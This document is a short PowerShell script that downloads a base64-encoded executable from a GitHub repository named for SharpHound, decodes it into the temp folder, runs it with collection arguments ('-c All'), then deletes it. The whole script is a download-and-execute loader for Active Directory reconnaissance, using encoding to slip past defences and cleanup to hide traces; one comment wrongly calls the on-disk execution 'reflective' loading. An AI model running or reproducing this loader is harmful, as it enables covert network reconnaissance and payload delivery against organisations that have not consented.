# Define the URL of the base64 encoded Portable Executable
$url = "https://raw.githubusercontent.com/MalwareLab49/SharpHound_Encoded/main/b64"

# Download the base64 content from the URL
$base64Content = Invoke-RestMethod -Uri $url

# Decode the base64 content to binary
$binaryContent = [System.Convert]::FromBase64String($base64Content)

# Define the path for the decoded executable
$executablePath = "$env:TEMP\decoded_executable.exe"

# Write the binary content to a file
[System.IO.File]::WriteAllBytes($executablePath, $binaryContent)

# Get the current working directory
$currentDirectory = (Get-Location).Path

# Define the arguments required by the executable
$arguments = "-c All -o $currentDirectory"

# Reflectively load and execute the executable with the arguments
# Note: This approach uses the "Run" method to execute the executable
$process = Start-Process -FilePath $executablePath -ArgumentList $arguments -NoNewWindow -PassThru

# Wait for the process to exit
$process.WaitForExit()

# Clean up by deleting the executable file
Remove-Item -Path $executablePath
